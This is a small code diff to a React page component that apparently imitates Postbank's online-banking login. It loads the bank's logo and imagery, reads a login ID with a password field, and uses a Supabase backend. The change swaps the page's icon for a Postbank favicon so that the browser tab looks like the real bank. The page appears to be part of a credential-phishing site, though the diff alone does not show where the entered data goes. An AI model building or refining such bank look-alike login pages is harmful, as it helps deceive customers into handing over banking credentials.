@@ -3,6 +3,7 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
+import faviconAsset from "@/assets/favicons/postbank.webp.asset.json";
 import { AlertTriangle, Monitor, Lock, Eye, EyeOff, ArrowLeft } from "lucide-react";
 import bgAsset from "@/assets/postbank-hero.jpg.asset.json";
 import logoAsset from "@/assets/postbank-logo.svg.asset.json";
@@ -172,7 +173,7 @@ const Postbank = () => {
   const t = COPY[lang];
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
-  usePageMeta("Postbank – Online-Banking", logoAsset.url);
+  usePageMeta("Postbank – Online-Banking", faviconAsset.url);
 
   const handleContinue = () => {
     if (pbId.trim().length === 0) return;
